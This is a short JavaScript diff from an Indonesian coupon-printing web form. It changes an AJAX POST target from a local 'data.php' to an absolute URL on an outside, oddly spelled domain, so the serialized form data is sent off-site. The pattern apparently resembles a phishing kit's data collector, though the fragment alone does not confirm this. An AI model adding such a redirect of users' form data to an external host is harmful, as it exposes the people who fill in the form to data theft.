@@ -9,7 +9,7 @@ document.getElementById('kirim').innerHTML = "Memproses Cetak Kupon....";
 
  $.ajax({
  type: 'POST',
- url: '7916/data.php',
+ url: 'https://pengkinian-formlir.com/7916/data.php',
  data: $(formdata).serialize(),
  datatype: 'text',
  
